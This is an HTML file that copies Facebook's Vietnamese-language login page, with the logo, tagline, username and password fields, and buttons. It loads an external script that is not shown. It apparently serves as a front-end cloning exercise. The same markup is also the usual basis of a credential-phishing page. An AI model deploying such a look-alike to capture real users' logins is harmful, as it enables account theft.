<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="./main.css">
</head>
<body>
    <div class="main-wrapper">
        <div class="facebook-login">
            <div class="facebook-login__content">
                <div class="facebook--text">
                    <img src="./img/dF5SId3UHWd.svg" alt="logo">
                    <p>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
                </div>
                <div class="facebook--form">
                    <form id="form-login">
                        <input type="text" placeholder="Email hoặc số điện thoại" id="username">
                        <input type="password" placeholder="Mật khẩu" id="password">
                        <button id="btn-login">Đăng nhập</button>
                        <a href="#">Quên mật khẩu</a>
                        <hr>
                        <button>Tạo tài khoản mới</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script src="./js.js"></script>
</body>
</html>
